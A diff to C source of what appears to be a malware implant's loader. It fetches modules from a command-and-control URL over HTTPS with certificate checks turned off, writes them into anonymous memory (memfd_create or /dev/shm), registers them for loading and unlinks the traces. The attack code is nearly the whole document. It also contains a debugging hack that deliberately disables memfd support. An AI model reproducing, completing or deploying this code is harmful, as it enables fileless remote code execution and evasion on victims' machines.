@@ -45,6 +45,9 @@ inline int memfd_create(const char *name, unsigned int flags) {
 // Detect if kernel is < or => than 3.17
 // Ugly as hell, probably I was drunk when I coded it
 // : Op_nomad: modded fallback, syscall checks
+//
+// return 0 - POSIX shm only , 1 - memfd_create supported
+// 
 int checKernel() {
 
 	struct utsname buffer;
@@ -84,8 +87,8 @@ int checKernel() {
 	}
 	else if ( memfd_kv_s.major > 3){
         if (memfdcheck == 1) {
-            memfd_kv_s.memfd_supp = 1;
-            return 1;
+            memfd_kv_s.memfd_supp = 0;// TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
+            return 0; // TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
         }
         memfd_kv_s.memfd_supp = 0;
 	}
@@ -96,8 +99,8 @@ int checKernel() {
 	}
 	else {
         if (memfdcheck == 1) {
-            memfd_kv_s.memfd_supp = 1;
-            return 1; 
+            memfd_kv_s.memfd_supp = 0;  // TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
+            return 0; // TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
         }
         memfd_kv_s.memfd_supp = 0;
         return 0;
@@ -121,33 +124,29 @@ void gen_random(char *s, const int len) {
 // Returns a file descriptor where we can write our shared object
 int open_ramfs(void) {
 
-    int shm_fd;
+    int shm_fd = 0;
     char s[6] = {};
 
-	//If we have a kernel < 3.17
-	// We need to use the less fancy way
 	if (memfd_kv_s.memfd_supp == 0) {
         gen_random(s, 6);
 		shm_fd = shm_open(s, O_RDWR | O_CREAT, S_IRWXU);
-		if (shm_fd < 0) { //Something went wrong :(
+		if (shm_fd < 0) { 
 			log_fatal("RamWorker: shm_fd: Could not open file descriptor");
-			return 1;
+			return 0;
 		}
 	}
-	// If we have a kernel >= 3.17
-	// We can use the funky style
 	else {
-		shm_fd = memfd_create(SHM_NAME, 1);
-		if (shm_fd < 0) { //Something went wrong :(
+        gen_random(s, 6);
+		shm_fd = memfd_create(s, 1); // flags?
+		if (shm_fd < 0) { 
 			log_fatal("RamWorker: memfd_create: Could not open file descriptor\n");
-			return -1;
+			return 0;
 		}
 	}
 	return shm_fd;
 }
 
 // Callback to write the shared object
-
 static size_t write_data (void *ptr, size_t size, size_t nmemb, void* userp) {
 
     Shared_Mem_Fd *shm_fd_s = (Shared_Mem_Fd *)userp;
@@ -162,25 +161,40 @@ static size_t write_data (void *ptr, size_t size, size_t nmemb, void* userp) {
 }
 
 // Download our share object from a C&C via HTTPs
-int download_to_RAM(char *download) { 
+int download_to_RAM(char *downloadUrl, char *fileName) { 
+
 	CURL *curl;
 	CURLcode res;
-	int shm_fd;
+	int shm_fd = 0;
 
 	shm_fd = open_ramfs(); // Give me a file descriptor to memory
-	log_info("RamWorker: File Descriptor %d Shared Memory created!", shm_fd);
 
-    Shared_Mem_Fd shm_fd_s = {0};
+    if (shm_fd == 0){ // memory not allocated - return
+	    log_debug("RamWorker: File Descriptor Shared Memory NOT created! Bailing.");
+        return shm_fd;
+    }
+
+	log_info("RamWorker: File Descriptor %d Shared Memory created", shm_fd);
+
+    Shared_Mem_Fd shm_fd_s = {.shm_fd=0, .shm_name={0} };
     shm_fd_s.shm_fd=shm_fd;
 
-	log_debug("RamWorker: Passing URL to cURL: %s", download);
+    // needed even?
+    if ( strlen(fileName) < SHM_NAME_MAX ){
+        memcpy(shm_fd_s.shm_name, fileName, strlen(fileName) );
+    }else{
+        memcpy(shm_fd_s.shm_name, fileName, SHM_NAME_MAX -1 );
+    }
+
+
+	log_debug("RamWorker: Passing URL to cURL: %s", downloadUrl);
 
     curl_global_init(CURL_GLOBAL_DEFAULT);    
 	// We use cURL to download the file
 	// It's easy to use and we avoid to write unnecesary code
 	curl = curl_easy_init();
 	if (curl) {
-		curl_easy_setopt(curl, CURLOPT_URL, download);
+		curl_easy_setopt(curl, CURLOPT_URL, downloadUrl);
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 		curl_easy_setopt(curl, CURLOPT_USERAGENT, ZCURL_AGENT);
@@ -193,15 +207,45 @@ int download_to_RAM(char *download) {
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
 			log_error("cURL: cURL failed: %s", curl_easy_strerror(res));
-			close(shm_fd);
-            shm_fd=0;
+            cleanup_os_resources(shm_fd);
+            return 0;
 		}
 		curl_easy_cleanup(curl);
 		return shm_fd;
 	}
-    return 0;
+
+    return shm_fd;
 }
 
+void cleanup_os_resources(int shm_fd){
+
+    char procpath[1024];
+    char *shmpath;
+    struct stat sb;
+    
+
+    // shm option: cleanup lingering file in /dev/shm
+    if (memfd_kv_s.memfd_supp == 0) { 
+        snprintf(procpath, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
+
+        if (lstat(procpath, &sb) != -1){
+            shmpath = realpath(procpath, NULL);
+            if (shmpath != NULL)
+            {
+                log_info("Cleanup: unlinking %s -> %s", procpath, shmpath);
+                unlink(shmpath);
+                free(shmpath);
+            }
+        }
+    }
+    
+    // memfd and shm options;
+    log_debug("Cleanup: Closing shm_fd: %d", shm_fd);
+    close(shm_fd); 
+
+    // mark unloaded in ShmMemTbl
+    mark_delete_mod(head, shm_fd);
+}
 
 int setMemfdTbl(int shm_fd, char* mname) {
     char path[1024];
@@ -212,9 +256,9 @@ int setMemfdTbl(int shm_fd, char* mname) {
     if (memfd_kv_s.memfd_supp == 1) { //Funky way
 	    log_debug("MemTbl: memfd_create() is supported.");
         snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
-    } else { // Not funky way :(
-        close(shm_fd); // TODO: test this whole thing. still drive via proc?
-        snprintf(path, 1024, "/dev/shm/%s", mname);
+    } else { 
+        snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd); 
+        //snprintf(path, 1024, "/dev/shm/%s", mname); 
 	    log_debug("MemTbl: only /dev/shm supported.");
     }
 
@@ -260,7 +304,7 @@ int main (int argc, char **argv) {
 void doWork(){
 
     char urlbuf[255] = {'\0'};
-    int fd, i;
+    int  i;
 
     if (checKernel() == 1){
 	    log_info("Worker: memfd_create() support seems to be available.");
@@ -274,10 +318,7 @@ void doWork(){
     {
         snprintf(urlbuf, sizeof(urlbuf), "%s%s", ccurl, modules[i]);
         log_debug("Worker: Module URL = %s", urlbuf);
-        fd = download_to_RAM(urlbuf);
-        if (fd != 0){
-            setMemfdTbl(fd, modules[i]);
-        }
+        load_mod(head, urlbuf);
     }
     
     setupCmdP();
@@ -669,6 +710,7 @@ int load_mod(node_t * head, char * url) {
       goto clean;
 
 
+    // Get file name
     uc = curl_url_get(h, CURLUPART_PATH, &path, 0);
     if(!uc) {
         log_debug("Path: %s (%d)b\n", path, strlen(path));
@@ -678,13 +720,12 @@ int load_mod(node_t * head, char * url) {
         }
     }
 
+    // Download file to memory
     log_debug("LoadMod: Downloading %s -> %s", url, path);
-    fd = download_to_RAM(url);
+    fd = download_to_RAM(url, cpath);
     if (fd != 0){
         log_debug("LoadMod: fetched OK, setting Mem table");
-
         setMemfdTbl(fd, cpath );
-
     }
 
 clean:
